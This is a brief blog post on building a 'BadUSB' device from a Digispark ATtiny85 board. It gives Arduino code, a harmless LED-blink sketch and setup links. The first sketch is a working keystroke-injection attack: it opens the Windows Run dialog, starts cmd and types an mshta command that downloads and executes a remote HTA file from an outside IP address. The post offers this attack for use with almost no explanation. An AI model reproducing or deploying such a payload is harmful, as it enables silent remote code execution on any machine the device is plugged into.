---
author: XhstormR
categories:
- MCU
- BadUSB
date: 2019-11-16T16:15:32+08:00
title: Digispark BadUSB
---

<!--more-->

Updated on 2019-11-16

> 基于 Attiny85 单片机

## Code
```c
#include "DigiKeyboard.h"

#define KEY_CAPSLOCK 57

void setup() {
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.println("cmd");
    DigiKeyboard.delay(500);
    DigiKeyboard.println("mshta http://1.1.1.1/main.hta & exit");
}

void loop() {
}
```

```c
void setup() {
    pinMode(1, OUTPUT);
}

void loop() {
    digitalWrite(1, HIGH);
    delay(1000);
    digitalWrite(1, LOW);
    delay(1000);
}
```

## Install
* https://github.com/arduino/Arduino
* https://github.com/digistump/arduino-boards-index
* https://github.com/digistump/DigistumpArduino/releases/latest

## Reference
* https://github.com/toxydose/Duckyspark
* [Digispark Example](https://github.com/digistump/DigistumpArduino/tree/master/digistump-avr/libraries/Digispark_Examples)
* [DigiMouse.h](https://github.com/digistump/DigistumpArduino/blob/master/digistump-avr/libraries/DigisparkMouse/DigiMouse.h)
* [DigiKeyboard.h](https://github.com/digistump/DigistumpArduino/blob/master/digistump-avr/libraries/DigisparkKeyboard/DigiKeyboard.h)
* [HID Usage Tables](https://source.android.google.cn/devices/input/keyboard-devices#hid-keyboard-and-keypad-page-0x07)
